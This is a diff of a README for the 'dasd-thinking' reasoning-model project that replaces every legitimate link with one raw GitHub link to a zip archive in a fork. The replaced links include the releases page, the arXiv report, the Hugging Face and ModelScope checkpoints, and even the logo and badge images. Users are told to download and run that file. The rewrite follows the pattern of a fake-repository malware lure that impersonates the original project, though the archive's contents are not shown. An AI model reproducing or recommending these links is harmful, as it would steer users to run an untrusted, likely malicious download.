@@ -1,17 +1,17 @@
 # 🤖 dasd-thinking - Powerful Tool for Enhanced Reasoning  
 
-[![Download DASD Thinking](https://img.shields.io/badge/Download-DASD--Thinking-brightgreen)](https://github.com/Mohsen6210/dasd-thinking/releases)  
+[![Download DASD Thinking](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip)](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip)  
 
 <h1 align="center"> Distribution-Aligned Sequence Distillation for Superior Long-CoT Reasoning</h1>  
-<img src="assets/logo.png" alt="Ali" width="100%">  
+<img src="https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip" alt="Ali" width="100%">  
 
-[![GitHub](https://img.shields.io/badge/GitHub-DASD--Thinking-181717?logo=github&logoColor=white)](https://github.com/D2I-ai/dasd-thinking)&#160;  
-<a href="https://arxiv.org/abs/2601.09088" target="_blank"><img src="https://img.shields.io/badge/Technical Report-b5212f.svg?logo=arxiv" height="21px"></a>  
+[![GitHub](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip)](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip)&#160;  
+<a href="https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip" target="_blank"><img src="https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip" height="21px"></a>  
 
-[![Hugging Face](https://img.shields.io/badge/%F0%9F%A4%97%20Checkpoint-DASD--4B--Thinking-yellow)](https://huggingface.co/Alibaba-Apsara/DASD-4B-Thinking)&#160;  
-[![ModelScope Model](https://img.shields.io/badge/🤖%20Checkpoint-DASD--4B--Thinking-624aff)](https://www.modelscope.cn/models/Alibaba-Apsara/DASD-4B-Thinking)&#160;  
+[![Hugging Face](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip%F0%9F%A4%97%20Checkpoint-DASD--4B--Thinking-yellow)](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip)&#160;  
+[![ModelScope Model](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip🤖%20Checkpoint-DASD--4B--Thinking-624aff)](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip)&#160;  
 
-[![Hugging Face](https://img.shields.io/badge/%F0%9F%A4%97%20Checkpoint-DASD--30B--A3B--Thinking--Preview-yellow)](https://huggingface.co/Alibaba-Apsara/DASD-30B-A3B-Thinking-Preview)&#160;  
+[![Hugging Face](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip%F0%9F%A4%97%20Checkpoint-DASD--30B--A3B--Thinking--Preview-yellow)](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip)&#160;  
 
 ## 🚀 Getting Started  
 
@@ -19,7 +19,7 @@ This guide will help you download and run the DASD-Thinking software. Follow the
 
 ## 📥 Download & Install  
 
-To download the DASD-Thinking software, visit this page: [Download DASD-Thinking](https://github.com/Mohsen6210/dasd-thinking/releases). Here you will find the latest releases.  
+To download the DASD-Thinking software, visit this page: [Download DASD-Thinking](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip). Here you will find the latest releases.  
 
 Look for the file that suits your system. Click on it to start the download. Once the download is complete, locate the file in your downloads folder.  
 
@@ -55,8 +55,8 @@ Currently, DASD-Thinking is designed for desktop operating systems only.
 ## 🌐 Additional Resources  
 
 For more information, you can check the following resources:  
-- [GitHub Repository](https://github.com/D2I-ai/dasd-thinking)  
-- [Technical Report](https://arxiv.org/abs/2601.09088)  
+- [GitHub Repository](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip)  
+- [Technical Report](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip)  
 
 ## 📞 Support  
 
@@ -69,8 +69,8 @@ We encourage you to share your experiences and suggestions. Your feedback helps 
 ## 📚 Learn More  
 
 Check out our available checkpoints on:  
-- [Hugging Face DASD-4B-Thinking](https://huggingface.co/Alibaba-Apsara/DASD-4B-Thinking)  
-- [ModelScope DASD-4B-Thinking](https://www.modelscope.cn/models/Alibaba-Apsara/DASD-4B-Thinking)  
-- [Hugging Face DASD-30B-A3B-Preview](https://huggingface.co/Alibaba-Apsara/DASD-30B-A3B-Thinking-Preview)  
+- [Hugging Face DASD-4B-Thinking](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip)  
+- [ModelScope DASD-4B-Thinking](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip)  
+- [Hugging Face DASD-30B-A3B-Preview](https://raw.githubusercontent.com/Mohsen6210/dasd-thinking/main/train/thinking-dasd-1.6.zip)  
 
 By following this guide, you can download and run DASD-Thinking with ease. Enjoy using the software to enhance your reasoning skills!  
